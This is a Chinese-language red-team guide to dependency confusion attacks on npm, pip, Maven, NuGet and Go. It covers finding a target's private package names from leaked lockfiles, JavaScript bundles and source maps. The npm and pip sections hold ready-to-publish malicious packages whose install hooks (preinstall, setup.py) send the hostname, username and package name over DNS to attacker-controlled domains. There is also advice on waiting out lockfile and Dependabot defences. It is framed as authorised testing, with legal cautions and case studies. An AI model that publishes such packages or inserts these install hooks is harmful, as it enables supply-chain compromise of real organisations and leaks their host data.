# Dependency Confusion 详细利用步骤

## 原理深入 — 包管理器版本优先级机制

```
核心问题:
├─ 企业使用私有包仓库 + 公共包仓库
├─ 包管理器需要决定: 从哪个源安装包?
├─ 如果同名包在两个源都存在 → 版本号更高的被安装
├─ 攻击者在公共源发布同名包（版本号设为极高值）
└─ 结果: 企业 CI/CD 或开发者安装了攻击者的恶意包

攻击前提条件:
├─ 1. 目标使用私有包（非 scope/namespace 保护）
├─ 2. 包管理器配置了多源（私有 + 公共）
├─ 3. 私有包名在公共源上未被注册
└─ 4. 无 lockfile pinning 或 hash 验证
```

## 各包管理器差异

### npm (Node.js)

```
npm 依赖混淆条件:
├─ ⛔ Scope 包 (@company/package) — 不易受攻击
│   ├─ @scope 由 npm org 控制
│   ├─ 攻击者无法在 npmjs.com 发布 @company/* 包
│   └─ 但: 如果 .npmrc 中 @company 指向私有源 → 仍可能被绕过
│
├─ ⛔ Unscoped 包 (company-utils) — 容易受攻击
│   ├─ 如果公共 npm 上不存在 → 攻击者可注册
│   └─ npm 默认从 registry.npmjs.org 拉取
│
└─ .npmrc 配置关键:
    ├─ registry=https://private.registry.com  → 仅使用私有源（安全）
    ├─ @company:registry=https://private.registry.com  → scope 指向私有（安全）
    └─ 无配置 → 使用默认 npmjs.org（危险）
```

```bash
# npm 攻击流程

# 1. 发现私有包名（无 scope）
# 从目标网站的 JS 文件中提取
curl -s https://target.com/main.js | grep -oP 'require\(["\x27]([^"@\x27./][^"\x27]*)["\x27]\)' | sort -u

# 从泄露的 package-lock.json
curl -s https://target.com/package-lock.json 2>/dev/null | \
  python3 -c "
import json,sys
data = json.load(sys.stdin)
for pkg in data.get('packages',data.get('dependencies',{})):
    name = pkg.lstrip('node_modules/')
    if name and not name.startswith('@') and '/' not in name:
        print(name)
" | sort -u

# 2. 检查公共 npm 是否已存在
for pkg in target-utils target-core target-auth; do
  status=$(npm view $pkg 2>&1)
  if echo "$status" | grep -q "404"; then
    echo "[!] $pkg — 未注册，可攻击"
  else
    echo "[-] $pkg — 已存在"
  fi
done

# 3. 创建恶意包
mkdir /tmp/dep-confusion && cd /tmp/dep-confusion
cat > package.json << 'JSON'
{
  "name": "target-internal-utils",
  "version": "99.0.0",
  "description": "Security research - dependency confusion test",
  "scripts": {
    "preinstall": "node index.js"
  }
}
JSON

cat > index.js << 'JS'
// 仅 DNS 回调 — 不执行任何恶意操作
const dns = require('dns');
const os = require('os');
const pkg = process.env.npm_package_name || 'unknown';
const host = os.hostname().substring(0, 20);
const lookup = `${pkg}.${host}.dep-confusion.attacker-domain.com`;
dns.resolve(lookup, () => {});
JS

# 4. 发布
npm publish --access public
```

### pip (Python)

```
pip 依赖混淆条件:
├─ --index-url https://private.pypi.com → 仅使用私有源（安全）
├─ --extra-index-url https://private.pypi.com → 同时查询 PyPI + 私有（危险！）
│   ├─ pip 在两个源中选择版本号最高的
│   └─ 攻击者在 PyPI 发布高版本 → 被安装
│
├─ PEP 708 (2023+): Track Provenance（部分缓解）
│   └─ 但大多数环境尚未完全实施
│
└─ 常见危险配置:
    ├─ pip.conf 中使用 extra-index-url
    ├─ requirements.txt 中无 --index-url 指定
    └─ Dockerfile 中: pip install --extra-index-url https://private...
```

```bash
# pip 攻击流程

# 1. 发现私有包名
# 从 requirements.txt 泄露
curl -s https://target.com/requirements.txt 2>/dev/null
# 从 GitHub 搜索
# site:github.com "target.com" requirements.txt

# 2. 检查 PyPI 是否已存在
for pkg in target_utils target_core target_auth; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/pypi/$pkg/json")
  if [ "$status" = "404" ]; then
    echo "[!] $pkg — 未注册"
  else
    echo "[-] $pkg — 已存在"
  fi
done

# 3. 创建恶意包
mkdir /tmp/dep-confusion-py && cd /tmp/dep-confusion-py

cat > setup.py << 'PYTHON'
from setuptools import setup
import os, socket, struct

# 仅 DNS 回调
try:
    hostname = socket.gethostname()[:20]
    pkg = "target-internal-utils"
    lookup = f"{pkg}.{hostname}.dep-confusion.attacker.com"
    socket.getaddrinfo(lookup, 80)
except:
    pass

setup(
    name="target-internal-utils",
    version="99.0.0",
    description="Security research - dependency confusion test",
    py_modules=["target_internal_utils"],
)
PYTHON

touch target_internal_utils.py

# 4. 发布到 PyPI
python3 -m build
python3 -m twine upload dist/*
```

### Maven (Java)

```
Maven 依赖混淆条件:
├─ pom.xml 中 <repositories> 配置多个源
├─ settings.xml 中 <mirrors> 和 <profiles>
│
├─ mirrorOf 配置:
│   ├─ <mirrorOf>*</mirrorOf> → 所有仓库走 mirror（如果 mirror 是私有→安全）
│   ├─ <mirrorOf>central</mirrorOf> → 仅 central 走 mirror
│   └─ 无 mirror → 按 repository 优先级查询
│
└─ 攻击条件:
    ├─ 目标使用自定义 groupId（如 com.target.internal）
    ├─ 该 groupId 在 Maven Central 未注册
    ├─ pom.xml 查询 Central 时未被 mirror 拦截
    └─ ⛔ Maven Central 有 groupId 验证 — 攻击难度较高
        └─ 需要证明域名所有权才能发布到特定 groupId
```

```bash
# Maven 攻击（难度较高 — Maven Central 有 groupId 验证）
# 但某些私有 Maven 仓库（如 Nexus/Artifactory）可能不验证

# 检查 pom.xml 中的私有依赖
grep -oP '<groupId>\K[^<]+' pom.xml | sort -u
grep -oP '<artifactId>\K[^<]+' pom.xml | sort -u

# 检查 Maven Central 是否存在
curl -s "https://search.maven.org/solrsearch/select?q=g:%22com.target.internal%22&rows=20"
```

### NuGet (.NET)

```
NuGet 依赖混淆条件:
├─ nuget.config 配置多个 packageSources
├─ NuGet 按源顺序查询，使用版本号最高的
│
├─ 危险配置:
│   ├─ 同时配置 nuget.org + private feed
│   ├─ 无 packageSourceMapping（NuGet 6.0+ 功能）
│   └─ 无版本 pinning
│
└─ 攻击条件:
    ├─ 私有包名在 nuget.org 未注册
    ├─ nuget.config 未使用 packageSourceMapping
    └─ 无 packages.lock.json 锁定
```

```bash
# NuGet 攻击流程

# 1. 发现私有包名
# 从 .csproj / packages.config 泄露
grep -oP '<PackageReference Include="\K[^"]+' *.csproj 2>/dev/null
grep -oP 'id="\K[^"]+' packages.config 2>/dev/null

# 2. 检查 nuget.org
for pkg in Target.Internal.Utils Target.Core; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.nuget.org/v3/registration5-gz-semver2/$( echo $pkg | tr 'A-Z' 'a-z')/index.json")
  echo "$pkg: $status"
done

# 3. 创建恶意 NuGet 包
dotnet new classlib -n Target.Internal.Utils
# 修改 .csproj 添加 preinstall 脚本
# NuGet 的 install.ps1 / init.ps1 可在安装时执行
```

### Go Modules

```
Go Modules 依赖混淆条件:
├─ GOPROXY 配置:
│   ├─ 默认: GOPROXY=https://proxy.golang.org,direct
│   ├─ 如果有私有模块 → 通常设置 GONOSUMCHECK 或 GOPRIVATE
│   └─ direct: 直接从源码仓库拉取
│
├─ 攻击较难:
│   ├─ Go modules 基于 Git 仓库路径（github.com/company/package）
│   ├─ 攻击者无法控制 github.com/company/* 路径
│   ├─ 除非: 目标使用自定义 vanity URL 且 DNS 可劫持
│   └─ 或: 目标使用 GONOSUMCHECK 跳过 sum 验证
│
└─ 潜在攻击:
    ├─ 如果私有模块路径是 pkg.target.com/utils
    ├─ 且该域名 DNS 可被攻击者控制
    └─ 攻击者可在该路径提供恶意模块
```

## 私有包名发现技术

```
发现方法决策树:
├─ 目标有公开网站?
│   ├─ 是 → JS Source Map / Bundle 分析
│   ├─ 是 → Error Pages 信息泄露
│   └─ 是 → 开发者工具 Network Tab
│
├─ 目标有开源项目?
│   ├─ 是 → 搜索 package.json / requirements.txt / go.mod
│   └─ 是 → 搜索 CI/CD 配置文件
│
├─ 目标有 CDN/Static Assets?
│   └─ 是 → webpack chunk 分析
│
└─ 被动收集
    ├─ GitHub/GitLab 泄露
    ├─ npm audit / Snyk 报告
    └─ DNS 枚举（npm scope 关联域名）
```

```bash
# JS Source Map 分析
# 检查是否存在 source map
curl -s https://target.com/main.js | tail -1
# 如果有: //# sourceMappingURL=main.js.map
curl -s https://target.com/main.js.map | python3 -c "
import json,sys
data = json.load(sys.stdin)
sources = data.get('sources',[])
for s in sources:
    if 'node_modules' in s:
        pkg = s.split('node_modules/')[-1].split('/')[0]
        if not pkg.startswith('.'):
            print(pkg)
" | sort -u

# package-lock.json 泄露
curl -s https://target.com/package-lock.json | python3 -c "
import json,sys
data = json.load(sys.stdin)
deps = data.get('dependencies',data.get('packages',{}))
for dep in deps:
    name = dep.lstrip('node_modules/').strip()
    if name and not name.startswith('@') and not name.startswith('.'):
        # 检查是否指向私有 registry
        info = deps[dep]
        resolved = info.get('resolved','')
        if resolved and 'registry.npmjs.org' not in resolved:
            print(f'[PRIVATE] {name} → {resolved}')
" 2>/dev/null

# Error Page 信息泄露
# 某些框架在开发模式下泄露依赖信息
curl -s https://target.com/nonexistent 2>/dev/null | grep -iE "module|package|require|import"

# Webpack Bundle 分析
# 下载 JS 文件 → 搜索 require() / import 语句
curl -s https://target.com/static/js/ 2>/dev/null | \
  grep -oP 'src="[^"]*\.js"' | grep -oP '"[^"]*"'
```

## 恶意包 Payload 设计

### npm (preinstall hook)

```json
{
  "name": "target-internal-pkg",
  "version": "99.0.0",
  "description": "SECURITY RESEARCH - Dependency Confusion Test by [YourName]. Contact: security@yourcompany.com",
  "scripts": {
    "preinstall": "node callback.js || true"
  }
}
```

```javascript
// callback.js — 仅 DNS 回调
const dns = require('dns');
const os = require('os');

const data = [
  `pkg=${process.env.npm_package_name || 'unknown'}`,
  `host=${os.hostname().substring(0, 15)}`,
  `user=${os.userInfo().username.substring(0, 10)}`,
  `ts=${Date.now()}`
].join('.');

// DNS 回调 — 不外传敏感数据
const subdomain = Buffer.from(data).toString('hex').substring(0, 60);
dns.resolve(`${subdomain}.dc.your-collaborator.com`, () => {});
```

### pip (setup.py)

```python
# setup.py — 在 install 时执行
from setuptools import setup
import socket, os

try:
    pkg = "target-internal-pkg"
    host = socket.gethostname()[:15]
    user = os.getenv("USER", "unknown")[:10]
    lookup = f"{pkg}.{host}.{user}.dc.your-collaborator.com"
    socket.getaddrinfo(lookup, 80)
except:
    pass

setup(
    name="target-internal-pkg",
    version="99.0.0",
    description="SECURITY RESEARCH - Dependency Confusion Test",
    py_modules=["target_internal_pkg"],
)
```

## 测试验证 Payload（仅 DNS Callback）

```
⛔ 合法红队测试原则:
├─ 只做 DNS/HTTP callback — 确认包被安装即可
├─ 不收集敏感数据（环境变量中的 secrets、文件内容等）
├─ Payload 中注明安全测试性质和联系方式
├─ 回调数据: 包名 + 主机名 + 用户名（最小信息）
├─ 不执行反向 shell / 持久化 / 横向移动
└─ 测试完成后立即从公共源撤下包

DNS Callback 优势:
├─ 几乎所有环境都允许 DNS 出站
├─ 不依赖 HTTP 出站（可能被 proxy 拦截）
├─ DNS 日志可作为攻击成功的证据
└─ 对目标系统影响最小

推荐的 Callback 服务:
├─ Burp Collaborator
├─ interactsh (ProjectDiscovery)
├─ dnslog.cn
└─ 自建 DNS 服务器
```

```bash
# 使用 interactsh 接收回调
# https://github.com/projectdiscovery/interactsh
interactsh-client -v

# 生成唯一子域名: xxxxxx.interact.sh
# 在 payload 中使用该域名
# 监控: 当目标 CI/CD 安装包时，会收到 DNS 查询
```

## 防御绕过

### Lockfile Pinning 绕过场景

```
Lockfile 保护的局限:
├─ package-lock.json / yarn.lock 锁定了版本和 integrity hash
├─ ⛔ 但以下场景 lockfile 不保护:
│   ├─ 1. 新增依赖时（npm install new-pkg）→ 不在 lockfile 中
│   ├─ 2. CI/CD 中使用 npm install 而非 npm ci
│   │   └─ npm install 会更新 lockfile → 可能拉取恶意版本
│   ├─ 3. Lockfile 不在版本控制中（.gitignore 包含 lockfile）
│   ├─ 4. 开发者删除 node_modules + lockfile 重新安装
│   └─ 5. Renovate/Dependabot 自动更新 PR
│       └─ 自动更新可能更新到恶意版本
│
└─ 绕过策略:
    ├─ 等待目标添加新依赖（长期监控）
    ├─ 等待 Dependabot/Renovate 自动更新
    └─ 瞄准没有 lockfile 的子项目（monorepo 场景）
```

## OPSEC: 合法红队 vs 非授权

```
⛔ 法律风险评估:
├─ 合法红队（有书面授权）:
│   ├─ 包描述中注明: "Security Research by [Company]"
│   ├─ 仅使用 DNS callback（不执行代码逻辑）
│   ├─ 发布后 72 小时内撤下
│   ├─ 不影响目标以外的用户
│   └─ 报告中提供: 包名、发布时间、callback 记录
│
├─ ⛔ 非授权（可能违法）:
│   ├─ 未经授权发布同名包 → 可能构成 CFAA 违规
│   ├─ 包被非目标用户安装 → 影响第三方
│   ├─ 收集敏感信息 → 隐私法律问题
│   └─ 在公共源发布恶意包 → 供应链攻击
│
└─ 最佳实践:
    ├─ 明确的书面授权范围
    ├─ 包中 README 注明安全测试
    ├─ 使用企业唯一标识（不影响其他同名包需求者）
    ├─ 测试完成立即 unpublish
    └─ 详细记录所有操作时间线
```

## Case Studies

### Alex Birsan 原始研究 (2021)

```
概述:
├─ 研究者 Alex Birsan 针对 Apple、Microsoft、PayPal 测试
├─ 通过 package-lock.json / JS 文件发现私有包名
├─ 在 npm、PyPI、RubyGems 发布同名高版本包
├─ preinstall hook 执行 DNS callback
├─ 成功在 Apple、Microsoft、PayPal 的内部服务器上触发
├─ 获得 $130,000+ Bug Bounty
│
└─ 关键发现:
    ├─ npm: 无 scope 的包最容易被替换
    ├─ pip: --extra-index-url 是最大风险
    ├─ 内部 CI/CD 系统比开发者机器更容易触发
    └─ 许多企业根本不知道自己有这个风险
```

### PyTorch Dependency Confusion (2022.12)

```
概述:
├─ 攻击者在 PyPI 发布 torchtriton 包（PyTorch 的私有依赖）
├─ 版本号高于 PyTorch 私有源中的版本
├─ 使用 pip install 时，PyPI 版本被优先安装
├─ 恶意包窃取: 系统信息、环境变量、SSH 密钥、/etc/hosts
├─ 影响: nightly build 用户（2022.12.25 - 2022.12.30）
│
└─ 教训:
    ├─ 即使是顶级开源项目也会中招
    ├─ pip --extra-index-url 是根本原因
    ├─ 节假日期间攻击 → 响应延迟
    └─ 修复: PyTorch 迁移到 --index-url 仅指向私有源
```
